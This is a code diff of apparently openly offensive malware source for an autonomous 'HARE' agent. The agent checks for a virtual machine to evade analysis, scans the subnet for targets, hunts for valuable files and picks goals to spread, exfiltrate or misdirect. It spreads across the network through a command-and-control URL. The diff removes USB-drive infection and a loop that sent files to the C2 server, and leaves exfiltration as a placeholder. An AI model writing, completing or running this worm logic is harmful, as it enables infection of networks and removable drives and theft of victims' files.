@@ -4,8 +4,7 @@ from enum import Enum, auto
 
 class Goal(Enum):
     """The primary goals the HARE can pursue."""
-    PROPAGATE_DIGITAL = auto()
-    PROPAGATE_PHYSICAL = auto()
+    PROPAGATE = auto()
     EXFILTRATE = auto()
     MISDIRECT = auto()
     DORMANT = auto()
@@ -27,14 +26,10 @@ class HareAgent:
         from modules.anti_analysis import is_virtual_machine
         from modules.scanner import intelligent_scan
         from modules.discovery import discover_files
-        from modules.environmental_sensing import get_environment_profile
-        from modules.physical_propagation import find_removable_drives
 
         self.environment_profile['is_vm'] = is_virtual_machine()
         self.environment_profile['network_targets'] = intelligent_scan(self.subnet)
         self.environment_profile['valuable_files'] = discover_files('image', '.')
-        self.environment_profile['physical_env'] = get_environment_profile()
-        self.environment_profile['removable_drives'] = find_removable_drives()
 
         logging.info(f"HARE: Environment profile updated.")
 
@@ -48,12 +43,8 @@ class HareAgent:
             self.current_goal = Goal.MISDIRECT
             return
 
-        if self.environment_profile.get('removable_drives'):
-            self.current_goal = Goal.PROPAGATE_PHYSICAL
-            return
-
         if len(self.environment_profile.get('network_targets', [])) > 1:
-            self.current_goal = Goal.PROPAGATE_DIGITAL
+            self.current_goal = Goal.PROPAGATE
             return
 
         if self.environment_profile.get('valuable_files'):
@@ -68,23 +59,13 @@ class HareAgent:
         """
         logging.info(f"HARE: Executing action for goal: {self.current_goal.name}")
 
-        if self.current_goal == Goal.PROPAGATE_DIGITAL:
+        if self.current_goal == Goal.PROPAGATE:
             from modules.ape import unleash_ape
             unleash_ape(self.c2_url, self.subnet)
 
-        elif self.current_goal == Goal.PROPAGATE_PHYSICAL:
-            from modules.physical_propagation import infect_drive
-            for drive in self.environment_profile['removable_drives']:
-                infect_drive(drive, self.payload_path)
-
         elif self.current_goal == Goal.EXFILTRATE:
-            from modules.ace import ace_exfiltrate
-            for f in self.environment_profile['valuable_files']:
-                try:
-                    with open(f, 'rb') as file_data:
-                        ace_exfiltrate(file_data.read(), self.c2_url)
-                except Exception as e:
-                    logging.error(f"HARE: Failed to exfiltrate {f}: {e}")
+            # from modules.ace import ace_exfiltrate # To be re-implemented
+            logging.info("HARE: Exfiltrating data (placeholder)...")
 
         elif self.current_goal == Goal.MISDIRECT:
             logging.info("HARE: Running misdirection tactics...")
